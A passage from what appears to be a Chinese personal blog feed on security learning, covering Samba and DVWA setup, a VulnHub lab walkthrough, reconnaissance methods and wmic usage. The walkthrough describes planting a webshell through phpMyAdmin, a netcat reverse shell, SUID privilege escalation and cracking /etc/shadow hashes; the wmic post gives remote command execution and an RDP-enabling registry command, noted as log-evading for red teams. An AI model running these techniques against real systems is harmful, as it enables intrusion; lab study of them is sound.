<p>Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。SMB（Server Messages Block，信息服务块）是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB协议是客户机/服务器型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。通过设置“NetBIOS over TCP/IP”使得Samba不但能与局域网络主机分享资源，还能与全世界的电脑分享资源。</p>
</blockquote>
<span id="more"></span>
<h2 id="打开物理机-修改IP地址"><a href="#打开物理机-修改IP地址" class="headerlink" title="打开物理机 修改IP地址"></a>打开物理机 修改IP地址</h2><p>物理机Win+R打开cmd  输入ipconfig查看当前ip<br>我们的虚拟机只需要和物理机配在同一网段就可以了</p>
<h2 id="打开虚拟机-修改IP地址"><a href="#打开虚拟机-修改IP地址" class="headerlink" title="打开虚拟机 修改IP地址"></a>打开虚拟机 修改IP地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-ens33</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/1.png"><br>进入vi模式后，按i开始编辑，变化前后如下</p>
<h4 id="编辑前"><a href="#编辑前" class="headerlink" title="编辑前"></a>编辑前</h4><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/2.png"></p>
<h4 id="编辑后"><a href="#编辑后" class="headerlink" title="编辑后"></a>编辑后</h4><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/3.png"></p>
<p>按ESC退出编辑 shift+:（冒号）至底部并输入wq后回车即可保存</p>
<h2 id="重启网络服务"><a href="#重启网络服务" class="headerlink" title="重启网络服务"></a>重启网络服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart network</span><br></pre></td></tr></table></figure>

<h2 id="创建挂载点"><a href="#创建挂载点" class="headerlink" title="创建挂载点"></a>创建挂载点</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /mnt/cdrom</span><br></pre></td></tr></table></figure>

<h2 id="链接光盘"><a href="#链接光盘" class="headerlink" title="链接光盘"></a>链接光盘</h2><p>点击vm左下角光盘图标即可<br><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/4.png"></p>
<h2 id="挂载光盘"><a href="#挂载光盘" class="headerlink" title="挂载光盘"></a>挂载光盘</h2><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/5.png"></p>
<h2 id="创建本地yum源"><a href="#创建本地yum源" class="headerlink" title="创建本地yum源"></a>创建本地yum源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/dev.repo</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/6.png"></p>
<h2 id="清理yum源"><a href="#清理yum源" class="headerlink" title="清理yum源"></a>清理yum源</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum clean all</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/7.png"></p>
<h2 id="安装samba"><a href="#安装samba" class="headerlink" title="安装samba"></a>安装samba</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install samba</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/8.png"><br><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/8.1.png"></p>
<h2 id="配置samba的配置文件"><a href="#配置samba的配置文件" class="headerlink" title="配置samba的配置文件"></a>配置samba的配置文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/samba/smb.conf</span><br></pre></td></tr></table></figure>

<h4 id="配置前："><a href="#配置前：" class="headerlink" title="配置前："></a>配置前：</h4><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/9.png"></p>
<h4 id="配置后："><a href="#配置后：" class="headerlink" title="配置后："></a>配置后：</h4><p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/10.png"></p>
<h2 id="创建共享位置并设置权限"><a href="#创建共享位置并设置权限" class="headerlink" title="创建共享位置并设置权限"></a>创建共享位置并设置权限</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir /opt/share</span><br><span class="line">chmod 777 /opt/share</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/11.png"></p>
<h2 id="创建smb用户"><a href="#创建smb用户" class="headerlink" title="创建smb用户"></a>创建smb用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbpasswd -a 用户名</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/12.png"> </p>
<h2 id="重启samba服务"><a href="#重启samba服务" class="headerlink" title="重启samba服务"></a>重启samba服务</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service smb restart</span><br><span class="line">service nmb restart</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/13.png"></p>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>物理机打开我的电脑 输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\虚拟机的IP地址</span><br></pre></td></tr></table></figure>
<p><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/14.png"><br>输入在虚拟机里设置的用户名和密码即可<br><img src="/2021/03/26/Red-Hat-7%E9%85%8D%E7%BD%AEsamba%E6%9C%8D%E5%8A%A1%E5%99%A8/15.png"></p>
<hr>
<blockquote>
<p>没有比人更高的山,没有比脚更长的路</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>Linux学习记录</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>靶机hacksudo: aliens渗透记录</title>
    <url>/2021/07/31/hacksudo-aliens/</url>
    <content><![CDATA[<p>很适合初学者的靶机，来尝试一下。</p>
<blockquote>
<p>下载地址：<a href="https://www.vulnhub.com/entry/hacksudo-aliens,676/">https://www.vulnhub.com/entry/hacksudo-aliens,676/</a></p>
</blockquote>
<hr>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机hacksudo: aliens×1<br>渗透机Kali Linux2021.2×1  和靶机在同一网段</p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机<br><img src="/2021/07/31/hacksudo-aliens/1.png"><br>确定靶机mac地址<br><img src="/2021/07/31/hacksudo-aliens/2.png"><br>扫描内网</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/31/hacksudo-aliens/3.png"><br>判断靶机ip之后用nmap进行信息探测</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.131</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/31/hacksudo-aliens/4.png"><br>web服务开着，去看一下<br><img src="/2021/07/31/hacksudo-aliens/5.png"><br>随意点了点，没找到什么东西，用dirb扫一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.55.131/</span><br></pre></td></tr></table></figure>
<p><img src="/2021/07/31/hacksudo-aliens/6.png"><br>发现有个/backup目录，去看一眼。<br><img src="/2021/07/31/hacksudo-aliens/7.png"><br>里面有个数据库备份文件，打开获得密码。<br><img src="/2021/07/31/hacksudo-aliens/8.png"><br>namap探测到还有一个网页，是phpMyAdmin后台登录界面。<br><img src="/2021/07/31/hacksudo-aliens/9.png"><br>把刚才收集到的账号密码输进去。<br><img src="/2021/07/31/hacksudo-aliens/10.png"><br>找到用户表，虽然密码都是加密过的，不过加密后的密文里发现root用户和我们是一样的，换成root登录进去。</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><img src="/2021/07/31/hacksudo-aliens/11.png"><br>查看文件写入权限<code>secure_file_priv</code>，如果参数为空，就可以任意写入<br>这里可以看到，是空的。<br><img src="/2021/07/31/hacksudo-aliens/12.png"><br>写入一句话。<br><img src="/2021/07/31/hacksudo-aliens/13.png"><br>蚁剑链接。<br><img src="/2021/07/31/hacksudo-aliens/14.png"><br>配合kali打一波nc反弹shell<br>链接成功之后尝试提权。<br><img src="/2021/07/31/hacksudo-aliens/15.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找suid权限文件。<br><img src="/2021/07/31/hacksudo-aliens/16.png"></p>
<blockquote>
<p><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
</blockquote>
<p>查找了一番，date程序可以用于提权。<br>成功读取/etc/shadow<br><img src="/2021/07/31/hacksudo-aliens/17.png"><br><img src="/2021/07/31/hacksudo-aliens/18.png"><br>找到了hacksudo的密文，使用工具john进行破解。<br><img src="/2021/07/31/hacksudo-aliens/19.png"><br>切换到用户hacksudo。<br><img src="/2021/07/31/hacksudo-aliens/20.png"><br>跟刚才一样，查找suid权限文件。<br><img src="/2021/07/31/hacksudo-aliens/21.png"><br>发现cpulimit程序可用于提权。<br><img src="/2021/07/31/hacksudo-aliens/22.png"><br>参考网站进行提权。<br><img src="/2021/07/31/hacksudo-aliens/23.png"><br>提权成功。进入/root即可读取flag</p>
<hr>
<blockquote>
<p>相识虽浅，似是经年。静守时光，以待流年。</p>
</blockquote>
<hr>
]]></content>
      <tags>
        <tag>靶机渗透记录</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集Information Gathering</title>
    <url>/2021/05/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86Information-Gathering/</url>
    <content><![CDATA[<p>【未完成，根据自己的学习情况不定时更新】<br>信息收集，渗透的第一步，也是最重要的一步。</p>
<h2 id="何为信息收集？"><a href="#何为信息收集？" class="headerlink" title="何为信息收集？"></a>何为信息收集？</h2><blockquote>
<p>信息收集（Information Gathering）是指通过各种方式获取所需要的信息。信息收集是信息得以利用的第一步，也是关键的一步。</p>
</blockquote>
<p>信息搜集是渗透测试的最重要的阶段!</p>
<span id="more"></span>
<h2 id="信息收集，收集什么？"><a href="#信息收集，收集什么？" class="headerlink" title="信息收集，收集什么？"></a>信息收集，收集什么？</h2><p>大概分为域名、服务器、Web程序这几种。<br>域名：whois信息  收集子域名  备案信息<br>服务器：dns信息  端口服务的开放情况  真实ip<br>Web程序：网站架构  敏感目录  敏感信息  源码泄露<br>网络空间：旁站查询  C端查询  指纹信息  waf探测<br>除了技术方面，还有一个突破口——社会工程学</p>
<p>看看，这么多东西。收集起来还是很累的<br>做好信息收集真的很重要，收集到信息的同时，你也逐渐有了渗透的思路<br>整理一些信息收集的方法，以供自己学习</p>
<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><h3 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h3><blockquote>
<p><a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a>       #站长之家暂不支持.edu.cn域名查询<br>  <a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a>       #平时也要闲着没事逛逛，说不定有意外惊喜呢<br>  <a href="https://www.huoxian.cn/">https://www.huoxian.cn/</a>    #火线，不过里面的资产是火线的规则收集的，并不是企业的而且爬虫全部搞定有点难实现</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#Linux whois命令  </span><br><span class="line">whois 网址                  #查询域名信息</span><br><span class="line">whois -H                    #查询域名信息省略法律声明</span><br><span class="line">whois -p 端口 网址          #指定端口查询</span><br></pre></td></tr></table></figure>
<p>查询whois信息的工具其实就是调用了网站接口 用网站查询效率就可以了<br>国际域名可以设置隐私保护，但国内域名不可以<br>而且只要在国内，必备案</p>
<h2 id="收集子域名、资产"><a href="#收集子域名、资产" class="headerlink" title="收集子域名、资产"></a>收集子域名、资产</h2><blockquote>
<p><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a>     #如果遇见泛解析防御机制就没有办法了<br>    <a href="https://fofa.so/">https://fofa.so</a>      #FoFa搜索引擎<br>    <a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a>       #钟馗之眼<br>    <a href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a>        #Dnsdb<br>    <a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a>    #奇安信网络空间测绘<br>    <a href="https://www.shodan.io/">https://www.shodan.io/</a><br>值得一提的是，shodan 的强大之处在于它可以探测到大致的地理位<br>置和获取一些摄像头，有利于给我们更多的线索</p>
</blockquote>
<h3 id="搜索引擎语法"><a href="#搜索引擎语法" class="headerlink" title="搜索引擎语法"></a>搜索引擎语法</h3><p>site:xxx.com<br>site:xxx.com intext:管理<br>site:xxx.com inurl:login/admin<br>site:xxx.com intitle:后台<br>site:xxx.com filetype:文件的格式（docx xlsx）</p>
<h2 id="服务器信息收集"><a href="#服务器信息收集" class="headerlink" title="服务器信息收集"></a>服务器信息收集</h2><h3 id="DNS信息搜集"><a href="#DNS信息搜集" class="headerlink" title="DNS信息搜集"></a>DNS信息搜集</h3><p>nslookup可用于查询DNS的记录，查询域名解析是否正常<br>不过还是直接去在线网站查</p>
<blockquote>
<p><a href="https://tool.chinaz.com/dns/">https://tool.chinaz.com/dns/</a>     #站长之家<br>  <a href="https://www.vsping.com/#/">https://www.vsping.com/#/</a>      #vsping，用着还行</p>
</blockquote>
<h3 id="探测端口服务"><a href="#探测端口服务" class="headerlink" title="探测端口服务"></a>探测端口服务</h3><p>网站多多少少都有，也有在线的</p>
<blockquote>
<p><a href="http://coolaf.com/tool/port">http://coolaf.com/tool/port</a><br>  <a href="http://www.ip33.com/port_scan.html">http://www.ip33.com/port_scan.html</a></p>
</blockquote>
<h3 id="真实ip"><a href="#真实ip" class="headerlink" title="真实ip"></a>真实ip</h3><p>大多网站开启了CDN加速，我们获取到的IP未必是真正的<br>二级域名可能没有放CDN 可以尝试<br>去不同的地方ping，若不同则说明用了CDN<br>通过一些页面和漏洞获取到服务器ip地址也是有可能的。<br>查找域名历史解析记录，域名在上CDN之前用的IP，很有可能就是CDN的真实源IP地址<br>查看邮件原文来确定ip地址</p>
<h2 id="网站架构"><a href="#网站架构" class="headerlink" title="网站架构"></a>网站架构</h2><h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><h2 id="-2"><a href="#-2" class="headerlink" title></a></h2><hr>
<blockquote>
<p>当我在呼吸时，我就在寻找希望</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>Web安全学习记录</category>
      </categories>
      <tags>
        <tag>Web安全学习记录</tag>
      </tags>
  </entry>
  <entry>
    <title>博客更新通知+未来学习计划</title>
    <url>/2021/08/24/%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%96%B0%E9%80%9A%E7%9F%A5-%E6%9C%AA%E6%9D%A5%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</url>
    <content><![CDATA[<h2 id><a href="#" class="headerlink" title></a></h2><p>最近还是没放下CTF<br>学安全跟CTF到底有没有关系呢？<br>我还是不知道<br>我现在会的东西80%来自打CTF认知的，剩下20%都是靶机里学的<br>还是太菜了……<br>CTF差不多也遇到瓶颈了吧，就会点简单的杂项<br>祥云杯就做出来3个杂项（层层取证+鸣雏恋+考古）<br>还是学学专业知识比较好<br>一直想学学编程 C语言还没怎么动呢<br>接下来还有更多的事要忙呢……</p>
<h2 id="-1"><a href="#-1" class="headerlink" title></a></h2><p>感觉时间不够用……<br>或者是自己不够努力，三天打鱼两天晒网感动自己吧<br>先把C语言学了，之后自己怎么样也不管了</p>
<h2 id="-2"><a href="#-2" class="headerlink" title></a></h2><p>加了一个安全团队，以后靶机渗透就不在博客更新了，以后都交给团队了。<br>一边写vulnhub靶机渗透，一边学习域渗透和尝试复现各种漏洞<br>这里就暂时不更新了，反正也没人看吧<br>想学习交流了可以直接联系我</p>
<h2 id="-3"><a href="#-3" class="headerlink" title></a></h2><p>接下来的计划大概是<br>学基础知识  毫无基础可言，所以开始搞一搞<br>学编程语言  C语言 Python<br>学域渗透 从0开始的学习了属于是</p>
<h2 id="-4"><a href="#-4" class="headerlink" title></a></h2><p>什么时候才能会挖洞呢……</p>
]]></content>
  </entry>
  <entry>
    <title>在win10搭建DVWA</title>
    <url>/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/</url>
    <content><![CDATA[<h2 id="搭建DVWA漏洞环境"><a href="#搭建DVWA漏洞环境" class="headerlink" title="搭建DVWA漏洞环境"></a>搭建DVWA漏洞环境</h2><p>下载phpstudy或wamp，我用的是phpstudy2018（此处感谢我的一位同学，很早就给我点到这里了，十分感谢！）<br>打开phpstudy，启动Apache和MySQL<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.1.png"></p>
<span id="more"></span>  
<p>然后进入phpadmin<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.2.png"><br>phpmyadmin数据库管理工具的用户名和密码默认都为root<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.3.png"><br>点击数据库，创建名为DVWA的数据库<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.4.png"><br>想查看的话可以通过phpstudy打开数据库存所对应的文件夹<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.5.png"><br>下载dvwa的zip包，解压放置到\phpStudy\PHPTutorial\WWW<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.6.png"><br>然后进入\PHPTutorial\WWW\DVWA-master\config  找到文件config.inc.php.dist<br>复制粘贴一份并将其名称改为config.inc.php【将.dist去掉即可】<br>进去修改配置，修改后如下：<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.65.png"><br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.7.png"><br>保存之后打开浏览器，地址栏输入127.0.0.1/DVWA-master/setup.php<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.8.png"><br>在这里需要看看Setup Check中是否有红色字体的Disabled<br>如果有，需要把问题解决才可以Create/reset database<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/2.9.png"><br>比如我这里就出问题了。PHP function allow_url_include:disabled<br>解决方法：先进入指定目录<br>选择自己版本的文件夹，我这里是php-5.4.45<br>打开后找到php.ini并进行修改<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.0.png"><br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.1.png"><br>修改后如下：<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.2.png"><br>修改后在浏览器打开127.0.0.1/DVWA-master/setup.php<br>问题解决了<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.3.png"><br>点击Create/reset database会自动跳转到DVWA的登录界面<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.4.png"><br>默认用户名：admin  密码：password<br><img src="/2021/02/27/%E5%9C%A8win10%E6%90%AD%E5%BB%BADVWA/3.5.png"><br>登录成功，部署成功！</p>
<hr>
<p>我真的适合这条路吗？我不知道<br>一直往前走，就适合了吧<br>2021年3月1日，有件事我可能会记很久，我本来在外面散心情。在外面的时候师傅突然问我要不要学东西，我立马跑回来家打开电脑。事后我觉得很震惊我没有想到我终于对学习这么上心了，心里酸酸的。时不时有人来问我学习视频看到哪里了，或者打ctf，有人问我博客的事，有人跟我分享学习……他们也给了我动力。<br>接下来，还有很长的路要走<br>加油，一起加油</p>
<hr>
<blockquote>
<p>我希望我希望的有希望</p>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>Web安全学习记录</category>
      </categories>
      <tags>
        <tag>Web安全学习记录</tag>
      </tags>
  </entry>
  <entry>
    <title>尝试接触Windows Debug</title>
    <url>/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/</url>
    <content><![CDATA[<p>最近在努力接触汇编，同学时刻告诫我要多动手，这篇笔记便是动手的证明。</p>
<p>感谢某位小天才的督促^_^</p>
<hr>
<h1 id="Debug是什么？"><a href="#Debug是什么？" class="headerlink" title="Debug是什么？"></a>Debug是什么？</h1><p>debug是Windows 16位或者32位机器上的一款调试工具。</p>
<p>也就是说64位是没有滴~</p>
<p>本次学习环境为Windows 2003  进入cmd后输入debug即可。</p>
<h1 id="初识Debug"><a href="#初识Debug" class="headerlink" title="初识Debug"></a>初识Debug</h1><p>debug /?</p>
<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/1.png"></p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r 显示当前所有寄存器和标志位的状态</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a 在内存中直接编写代码</span><br></pre></td></tr></table></figure>

<p>输入汇编指令后跟段地址:偏移地址（例：a 0000:0100）</p>
<p>回车之后就可以输入了，停止输入时按Enter键即可</p>
<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/3.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d 显示存储器内容</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/4.png"></p>
<p>没修改之前的</p>
<p><img src="/2022/03/15/%E5%B0%9D%E8%AF%95%E6%8E%A5%E8%A7%A6Windows-Debug/5.png"></p>
]]></content>
      <categories>
        <category>我的pwn学习之路</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>强大工具wmic的学习记录</title>
    <url>/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>Windows 系统自带的 wmic 命令——内网大杀器！</p>
<p>在用WMIC执行命令过程中，操作系统默认不会将WMIC的操作记录在日志中，因此也是红队必备！</p>
<p><strong>但要记得</strong></p>
<p>使用WMIC连接远程主机，需要目标主机开放135和445(135 端⼝是 WMIC 默认的管理端⼝,445是远程连接端口)</p>
<p>可用<strong>netstat -an</strong>查看开放端口</p>
<p>由于这几天比较急着学，所以只学暂时会用到的，本篇笔记不包含所有用法！【回头填坑，画大饼中】</p>
<p>想要把回显的结果保存到文本里就在最后加上 <strong>&gt; D:\1.txt</strong> 即可</p>
<h5 id="查看主机内的账号"><a href="#查看主机内的账号" class="headerlink" title="查看主机内的账号"></a>查看主机内的账号</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic useraccount get name,SID</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; useraccount get name,SID</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png"></p>
<span id="more"></span>

<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png"></p>
<h5 id="查看工作组-域"><a href="#查看工作组-域" class="headerlink" title="查看工作组/域"></a>查看工作组/域</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic computersystem get domain</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; computersystem get domain</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/3.png"></p>
<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/4.png"></p>
<h5 id="列出进程的核心信息"><a href="#列出进程的核心信息" class="headerlink" title="列出进程的核心信息"></a>列出进程的核心信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic process list brief</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process list brief</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/5.png"></p>
<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/6.png"></p>
<h5 id="wmic开启3389端口"><a href="#wmic开启3389端口" class="headerlink" title="wmic开启3389端口"></a>wmic开启3389端口</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;QBY-11A2C3B9FAE&#x27; call SetAllowTSConnections 1</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process call create &#x27;cmd.exe /c REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/7.png"></p>
<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/8.png"></p>
<h5 id="获取可执行文件的路径"><a href="#获取可执行文件的路径" class="headerlink" title="获取可执行文件的路径"></a><strong>获取可执行文件的路径</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地:</span><br><span class="line">wmic process where name=&quot;vmtoolsd.exe&quot; get executablepath</span><br><span class="line">远程:</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process where name=&quot;vmtoolsd.exe&quot; get executablepath</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/9.png"></p>
<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/10.png"></p>
<h5 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a><strong>执行程序</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">本地：</span><br><span class="line">wmic process call create &quot;calc&quot;</span><br><span class="line">远程：(未成功打开)</span><br><span class="line">wmic /node:192.168.155.137 /user:&quot;administrator&quot; /password:&quot;qwe123&quot; process call create &quot;calc&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/31/%E5%BC%BA%E5%A4%A7%E5%B7%A5%E5%85%B7wmic%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/11.png"></p>
]]></content>
  </entry>
  <entry>
    <title>我的pwn学习之路——第二天</title>
